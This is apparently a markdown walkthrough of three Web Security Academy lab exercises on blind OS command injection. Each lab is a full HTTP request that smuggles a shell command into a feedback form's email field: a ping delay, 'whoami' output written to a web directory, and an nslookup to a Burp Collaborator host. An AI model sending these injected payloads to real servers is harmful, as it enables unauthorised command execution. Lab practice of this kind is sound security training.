

# OS COMMAND INJECTION

## LAB-2) Blind OS command injection with time delays


STEP-1)

![image](https://user-images.githubusercontent.com/68326057/128892383-e9aec988-b43b-4dac-bc4c-953c2c75947b.png)

STEP-2)

```bash
POST /feedback/submit HTTP/1.1
Host: ac041fce1e24ab7180d2370100730005.web-security-academy.net
Cookie: session=6Iw9a3yAPtStpbrmdDu68WNb3A6k6vVR
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
Origin: https://ac041fce1e24ab7180d2370100730005.web-security-academy.net
Dnt: 1
Referer: https://ac041fce1e24ab7180d2370100730005.web-security-academy.net/feedback
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=uHWDGdgN9S2HeIvIbnMKAxdf5PmuSQQs&name=name&email=email@gmail.com||ping+-c+10+127.0.0.1+||&subject=subject&message=message
```

After 10 Seconds.

![image](https://user-images.githubusercontent.com/68326057/128909609-fa787d65-1b88-4f39-a41b-be362b41a696.png)

![image](https://user-images.githubusercontent.com/68326057/128909629-e66ce51c-7f1d-4f60-b1e3-bdf4b4a44c50.png)


## Lab-3 Blind OS command injection with output redirection

Payload:-

```bash
POST /feedback/submit HTTP/1.1
Host: acd11fb11fa2411680e740d90038004c.web-security-academy.net
Cookie: session=uFl7VHy3dT2YLBOLgmgtMIOinY8QyBWz
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 145
Origin: https://acd11fb11fa2411680e740d90038004c.web-security-academy.net
Dnt: 1
Referer: https://acd11fb11fa2411680e740d90038004c.web-security-academy.net/feedback
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=hHEEDk0KRZTtArhIqwQfVrJQjAvKjQvM&name=name&email=email%40gmail.com+||+whoami+>+/var/www/images/whoami.txt+||&subject=subject&message=message
```

Right Click on image , Then Click `open in new tab`

![image](https://user-images.githubusercontent.com/68326057/128911707-f3090511-5e25-428b-b0a1-0413cb460b9a.png)

Then Change The filename to `whoami.txt`.

![image](https://user-images.githubusercontent.com/68326057/128911867-491ce1c7-4562-44dc-921f-84f37e05c525.png)

![image](https://user-images.githubusercontent.com/68326057/128911934-76da5445-bf14-4b43-acd2-bee1211139cf.png)

## Lab 4 : Blind OS command injection with out-of-band interaction

Payload:-

```bash
POST /feedback/submit HTTP/1.1
Host: ac1f1f661efdc245818722e80018005e.web-security-academy.net
Cookie: session=a9yJsPSWgyXARo18dDIub3juYWZLmpVs
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
Origin: https://ac1f1f661efdc245818722e80018005e.web-security-academy.net
Dnt: 1
Referer: https://ac1f1f661efdc245818722e80018005e.web-security-academy.net/feedback
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=u9t9yeYVcJ9iZLxiTXUtAY48zZ1qvgal&name=name&email=email%40gmail.com+||+nslookup+test.burpcollaborator.net+||&subject=subject&message=message
```

![image](https://user-images.githubusercontent.com/68326057/128914896-456aff67-fef2-4d88-982d-0aa4832c0a39.png)


